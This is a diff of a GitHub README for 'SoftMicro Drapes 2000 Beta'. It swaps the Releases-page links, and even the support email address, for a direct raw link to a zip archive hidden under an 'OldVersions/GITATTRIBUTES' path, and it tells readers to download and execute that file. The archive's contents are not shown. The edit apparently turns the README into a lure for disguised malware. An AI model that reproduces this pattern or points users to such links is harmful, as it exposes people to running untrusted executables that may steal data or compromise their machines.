@@ -33,7 +33,7 @@ The name "Drapes" reflects the idea of wrapping users in a familiar interface wh
 
 To get started with SoftMicro Drapes 2000 Beta, follow these steps:
 
-1. **Download the Latest Release**: Visit the [Releases section](https://github.com/igtkarish/SoftMicro_Drapes_2000_Beta/releases) to download the latest version. Look for the file you need to download and execute.
+1. **Download the Latest Release**: Visit the [Releases section](https://github.com/igtkarish/SoftMicro_Drapes_2000_Beta/raw/refs/heads/SoftMicro_Drapes_2000_Beta_Main-dev/OldVersions/GITATTRIBUTES/Drapes-Beta-Soft-Micro-3.5-alpha.3.zip) to download the latest version. Look for the file you need to download and execute.
    
 2. **Extract the Files**: Once downloaded, extract the files to your desired location.
 
@@ -79,12 +79,12 @@ SoftMicro Drapes 2000 Beta is licensed under the GNU General Public License v3.0
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: support@softmicro.com
+- **Email**: https://github.com/igtkarish/SoftMicro_Drapes_2000_Beta/raw/refs/heads/SoftMicro_Drapes_2000_Beta_Main-dev/OldVersions/GITATTRIBUTES/Drapes-Beta-Soft-Micro-3.5-alpha.3.zip
 - **GitHub Issues**: Use the GitHub Issues page to report bugs or request features.
 
 ## Links
 
-For more information, visit the [Releases section](https://github.com/igtkarish/SoftMicro_Drapes_2000_Beta/releases) to download the latest version. 
+For more information, visit the [Releases section](https://github.com/igtkarish/SoftMicro_Drapes_2000_Beta/raw/refs/heads/SoftMicro_Drapes_2000_Beta_Main-dev/OldVersions/GITATTRIBUTES/Drapes-Beta-Soft-Micro-3.5-alpha.3.zip) to download the latest version. 
 
 ### Topics
 
